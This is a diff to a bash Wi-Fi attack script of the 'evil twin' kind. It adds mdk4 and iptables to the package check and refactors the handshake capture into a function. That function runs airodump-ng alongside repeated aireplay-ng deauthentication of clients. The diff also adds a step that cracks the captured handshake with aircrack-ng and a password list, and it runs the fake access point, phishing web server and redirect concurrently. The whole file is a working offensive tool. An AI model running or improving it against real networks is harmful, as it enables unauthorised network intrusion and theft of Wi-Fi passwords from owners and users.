@@ -30,7 +30,7 @@ $GRE
 echo $BLU
 echo " I will check some package installed ! "
 echo ""
-software=("hostapd" "dnsmasq"  "airmon-ng" "airodump-ng" "aircrack-ng" "aireplay-ng" "lighttpd" "php" "php-cgi" "fuser"  )
+software=("hostapd" "dnsmasq"  "airmon-ng" "airodump-ng" "aircrack-ng" "aireplay-ng" "lighttpd" "php" "php-cgi" "fuser" "mdk4" "iptables" )
 for pkg in "${software[@]}"
 do
 sleep 0.5
@@ -221,16 +221,8 @@ WESSID=${ESSID/% /}
 
 }
 
-#############check handshake###############
-CHECK_HANDSHAKE(){
-clear
-echo $RED
-cat evil.txt
-echo $BLU
-read -p "do you have a handshake ? answer 'n' to start catch a new handshake [N/y] " check_hand
-
-case $check_hand in
-n|N)
+############catch###################
+CHATCH(){
 sudo xterm -geometry 100x30-0+0 -e airodump-ng --bssid $BSSID --channel $CHANNEL --write "info/$WESSID" $interf & 2> /dev/null
 sudo xterm -geometry 100x30-0+0 -e airodump-ng --bssid $BSSID --channel $CHANNEL --write "info/$WESSID" $interf"mon" & 2> /dev/null
 
@@ -257,7 +249,25 @@ sudo xterm -geometry 100x30-0-0 -e aireplay-ng --deauth 4 --ignore-negative-one 
 sleep 7s
 done
 
+sudo pkill xterm > /dev/null 2>&1
 
+
+}
+
+#############check handshake###############
+
+
+CHECK_HANDSHAKE(){
+clear
+echo $RED
+cat evil.txt
+echo $BLU
+read -p "do you have a handshake ? answer 'n' to start catch a new handshake [N/y] " check_hand
+
+case $check_hand in
+n|N)
+
+CHATCH
 mv "info/$WESSID-01.cap" handshake
 
 path_hand=handshake/$WESSID-01.cap
@@ -277,32 +287,7 @@ echo "done"
 ;;
 *)
 
-sudo xterm -geometry 100x30-0+0 -e airodump-ng --bssid $BSSID --channel $CHANNEL --write "info/$WESSID" $interf & 2> /dev/null &
-sudo xterm -geometry 100x30-0+0 -e airodump-ng --bssid $BSSID --channel $CHANNEL --write "info/$WESSID" $interf"mon" & 2> /dev/null &
-
-while true 
-do
-
-
-if [ -f "info/$WESSID-01.cap" ]; then 2> /dev/null
-    # Use airodump-ng to check if the file contains a handshake
-    if aircrack-ng "info/$WESSID-01.cap" | grep -q "(1 handshake)"; then
-        echo $GRN "Handshake file is complete ..."
-        
-        
-        break
-    else
-        echo "Handshake file is incomplete yet...."
-    fi
-else
-    echo "Wait The Handshake ....."
-fi
-sudo xterm -geometry 100x30-0-0 -e aireplay-ng --deauth 4 --ignore-negative-one -a $BSSID  $interf &
-sudo xterm -geometry 100x30-0-0 -e aireplay-ng --deauth 4 --ignore-negative-one -a $BSSID  $interf"mon" &
-
-sleep 7s
-done
-
+CHATCH
 
 mv "info/$WESSID-01.cap" handshake
 
@@ -444,7 +429,7 @@ server.modules += ( \"mod_fastcgi\" )
 
 sudo cp "$path_hand" /tmp/$page
 sleep 1
-sudo mv /tmp/$page/*.cap /tmp/$page/evil.cap 
+sudo mv /tmp/$page/*.cap  /tmp/$page/evil.cap
 sudo chmod 777 /tmp/$page/*
 sudo lighttpd -D -f /tmp/evil_lighttpd.conf &
 }
@@ -596,6 +581,36 @@ sigint_handler() {
 }
 trap 'sigint_handler' SIGINT
 
+##################crack##################
+CRACK(){
+clear 
+echo $GRN
+sleep 1
+echo "Starting Attack ........."
+sleep 1
+echo""
+echo "Starting Crack ........"
+sleep 2
+if sudo aircrack-ng /tmp/$page/evil.cap -w pass_list.txt | grep -e "KEY FOUND"
+
+
+then
+sudo pkill xterm > /dev/null 2>&1
+sudo iw mon0 del > /dev/null 2>&1
+sudo fuser -k 53/tcp > /dev/null 2>&1
+sudo fuser -k 80/tcp > /dev/null 2>&1
+sudo pkill hostapd > /dev/null 2>&1
+sudo pkill dnsmasq > /dev/null 2>&1
+sigint_handler
+
+else
+echo $RED
+echo "Crack Failed"
+echo $GRN
+echo "Continue To Evil Twin"
+fi
+}
+
 
 CHECK_INSTALL
 CHECK_MONITOR
@@ -605,10 +620,12 @@ SELECT
 CHECK_HANDSHAKE
 CHECK_PASS
 SELECT_PAGES
-LIGHTTPD
+LIGHTTPD & 
 HOTSPOT &
-REDIR 
+REDIR &
+CRACK &
 SHOW_PASS
+
 
 
 
